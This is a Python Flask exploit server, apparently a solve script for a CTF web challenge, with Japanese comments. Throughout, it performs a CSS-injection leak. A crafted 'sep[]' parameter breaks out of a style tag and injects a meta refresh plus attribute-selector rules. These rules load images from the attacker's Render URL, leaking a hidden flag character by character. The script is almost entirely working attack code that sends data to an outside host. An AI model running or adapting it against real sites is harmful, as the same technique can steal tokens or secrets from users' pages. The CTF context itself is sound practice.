from flask import Flask, request, redirect
import urllib.parse
import sys
import os

app = Flask(__name__)

# ==========================================
# 設定
MY_URL = "https://capture-the-f-l-a-g.onrender.com" # あなたのRender URL
TARGET_URL = "http://web:3000"
# アルファベット小文字、数字、記号（必要に応じて大文字も追加してください）
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
KNOWN_FLAG = "tkbctf{"
# ==========================================

@app.route('/start')
def start():
    """Botに最初に踏ませるエンドポイント"""
    global KNOWN_FLAG
    KNOWN_FLAG = "tkbctf{"
    print("[*] Attack Started! Resetting flag...", file=sys.stderr)
    
    html = """
    <!DOCTYPE html>
    <html>
    <body>
      <h1>Exploit Loading...</h1>
      <script>
        setTimeout(() => { window.location.href = '/next'; }, 500);
      </script>
    </body>
    </html>
    """
    return html

@app.route('/next')
def next_char():
    """次の1文字を特定するための軽量化CSSとURLを動的に生成する"""
    global KNOWN_FLAG
    
    if KNOWN_FLAG.endswith("}"):
        return f"<h1>Attack Finished!</h1><p>Flag: {KNOWN_FLAG}</p>"

    current_pos = len(KNOWN_FLAG)
    print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {current_pos})", file=sys.stderr)

    css_rules = []
    # tはテキストとして吸収されるため、1つ目の<a>タグは'k'になる。
    # つまり current_pos の数値がそのまま <a> タグの順番（nth-of-type）と一致する！
    target_nth = current_pos

    for char in CHARSET:
        # URLを極限まで短くするため、エンドポイントを /l に変更
        rule = f"a:nth-of-type({target_nth})[id^='{char}']{{display:block;padding:1px;background:url({MY_URL}/l?c={char}&p={current_pos})}}"
        css_rules.append(rule)

    css_payload = "".join(css_rules)

    # ping-pongの間隔を0.5秒に短縮（10秒間で20文字抜くため）
    sep0 = f'"></style><meta http-equiv="refresh" content="0.5; url={MY_URL}/next"><style>{css_payload}</style>'
    sep1 = '<a id="'

    params = urllib.parse.urlencode({'sep[]': [sep0, sep1]}, doseq=True)
    exploit_url = f"{TARGET_URL}/?{params}"
    
    return redirect(exploit_url)

@app.route('/l')
def leak():
    """CSSからの画像リクエスト（1文字特定）を受け取るエンドポイント"""
    global KNOWN_FLAG
    char = request.args.get('c')
    pos = request.args.get('p', type=int)

    if char and pos == len(KNOWN_FLAG):
        KNOWN_FLAG += char
        print(f"[+] Leaked! New Flag: {KNOWN_FLAG}", file=sys.stderr)

    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return transparent_gif, 200, {'Content-Type': 'image/gif'}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)